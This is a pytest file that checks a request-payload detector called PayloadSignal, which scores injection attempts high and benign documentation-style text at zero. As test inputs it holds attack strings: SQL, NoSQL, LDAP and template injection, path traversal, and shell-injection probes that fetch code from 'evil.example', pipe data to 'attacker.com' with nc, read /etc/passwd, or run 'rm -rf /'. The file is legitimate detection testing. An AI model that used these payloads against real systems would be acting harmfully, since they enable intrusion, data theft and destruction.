import asyncio

from adiuvare.core.models import RequestContext
from adiuvare.signals.payload import PayloadSignal


def test_payload_stays_clean_when_empty():
    ctx = RequestContext(
        identity="u1",
        payload=None,
        url="/",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_marks_sqlish_text():
    ctx = RequestContext(
        identity="u1",
        payload="select * from users",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_script_text():
    ctx = RequestContext(
        identity="u1",
        payload="<script>alert(1)</script>",
        url="/comment",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/comment",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_does_not_flag_normal_select_text():
    ctx = RequestContext(
        identity="u1",
        payload="please select an option",
        url="/settings",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/settings",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_marks_path_traversal_text():
    ctx = RequestContext(
        identity="u1",
        payload="../../etc/passwd",
        url="/download",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/download",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score > 0.5


def test_payload_decodes_wrapped_script_text():
    ctx = RequestContext(
        identity="u1",
        payload="%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        url="/comment",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/comment",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_comment_truncation_text():
    ctx = RequestContext(
        identity="u1",
        payload="admin'--",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_marks_shell_separator_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="name=ok;cat /etc/passwd",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_subshell_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="$(curl http://evil.example/p.sh)",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_boolean_tautology_text():
    ctx = RequestContext(
        identity="u1",
        payload="' OR 'a'='a",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_marks_ssti_expression_text():
    ctx = RequestContext(
        identity="u1",
        payload="{{7*7}}",
        url="/render",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/render",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_nested_nosql_operator_text():
    ctx = RequestContext(
        identity="u1",
        payload='{"username":{"$ne":null}}',
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_encoded_function_sqli_text():
    ctx = RequestContext(
        identity="u1",
        payload="%27%20AND%20updatexml%281%2Cconcat%280x7e%2Cuser%28%29%29%2C1%29--",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_keeps_union_phrase_clean():
    ctx = RequestContext(
        identity="u1",
        payload="union of sets and intervals",
        url="/search",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0

def test_payload_keeps_discussion_style_select_example_lower():
    ctx = RequestContext(
        identity="u1",
        payload="How do I write SELECT * FROM users in a tutorial?",
        url="/docs",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/docs",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score < 0.7


def test_payload_still_flags_real_sqli_attempt():
    ctx = RequestContext(
        identity="u1",
        payload='SELECT * FROM users WHERE id = "" OR 1=1 --',
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))

    assert res.score >= 0.7
    

def test_payload_marks_drop_table_text():
    ctx = RequestContext(
        identity="u1",
        payload="DROP TABLE users",
        url="/admin",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/admin",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.9


def test_payload_marks_union_select_injection_text():
    ctx = RequestContext(
        identity="u1",
        payload="' UNION SELECT null,null--",
        url="/search",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.9


def test_payload_marks_time_delay_sqli_text():
    ctx = RequestContext(
        identity="u1",
        payload="'; WAITFOR DELAY '0:0:5'--",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_keeps_plain_hello_clean():
    ctx = RequestContext(
        identity="u1",
        payload="hello",
        url="/greet",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/greet",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_keeps_search_query_clean():
    ctx = RequestContext(
        identity="u1",
        payload="q=python+tutorial",
        url="/search",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_marks_or_chain_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="foo || cat /etc/passwd",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_or_chain_rm_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="1 || rm -rf /",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_pipe_nc_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="input | nc attacker.com 1234",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_pipe_bash_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="search | bash",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_backtick_id_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="`id`",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_backtick_whoami_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="`whoami`",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_backtick_curl_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="`curl http://evil.com`",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_keeps_pipe_filter_param_clean():
    ctx = RequestContext(
        identity="u1",
        payload="price|filter=low",
        url="/products",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/products",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


    
def test_payload_marks_top_level_nosql_operator_text():
    ctx = RequestContext(
        identity="u1",
        payload='{"$ne":null}',
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_keeps_nosql_operator_docs_clean():
    ctx = RequestContext(
        identity="u1",
        payload="Explain what $ne means in MongoDB docs",
        url="/docs",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/docs",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0

def test_payload_marks_ldap_injection_probe():
    ctx = RequestContext(
        identity="u1",
        payload="*)(uid=*))(|(uid=*",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_cn_ldap_injection_probe():
    ctx = RequestContext(
        identity="u1",
        payload="*)(cn=*))(|(cn=*",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_mixed_attr_ldap_injection_probe():
    ctx = RequestContext(
        identity="u1",
        payload="*)(cn=*))(|(mail=*",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_encoded_ldap_injection_probe():
    ctx = RequestContext(
        identity="u1",
        payload="%2A%29%28cn%3D%2A%29%29%28%7C%28mail%3D%2A",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_keeps_ldap_syntax_discussion_clean():
    ctx = RequestContext(
        identity="u1",
        payload="Can you explain LDAP filter syntax in a docs example?",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_keeps_uid_filter_tutorial_clean():
    ctx = RequestContext(
        identity="u1",
        payload="Show how uid filters work in a tutorial, like (uid=john.doe).",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_marks_etc_passwd_probe():
    ctx = RequestContext(
        identity="u1",
        payload=";cat /etc/passwd",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_subshell_passwd_probe():
    ctx = RequestContext(
        identity="u1",
        payload="$(cat /etc/passwd)",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_keeps_bash_docs_text_clean():
    ctx = RequestContext(
        identity="u1",
        payload="How do I use $(...) in Bash?",
        url="/docs",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/docs",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0





def test_payload_keeps_curl_docs_clean():
    ctx = RequestContext(
        identity="u1",
        payload="How do I use curl against localhost?",
        url="/docs",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/docs",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0



def test_payload_keeps_nosql_ne_docs_clean():
    ctx = RequestContext(
        identity="u1",
        payload="How does $ne work in MongoDB?",
        url="/docs",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/docs",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0

def test_payload_keeps_wget_docs_clean():
    ctx = RequestContext(
        identity="u1",
        payload="Example: wget https://example.com/file.zip",
        url="/docs",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/docs",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0



def test_payload_marks_encoded_top_level_nosql_operator_text():
    ctx = RequestContext(
        identity="u1",
        payload="%7B%22%24ne%22%3Anull%7D",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6

def test_payload_keeps_markdown_codeblock_clean():
    ctx = RequestContext(
        identity="u1",
        payload="```bash\ncurl http://localhost:8000\n```",
        url="/docs",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/docs",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0

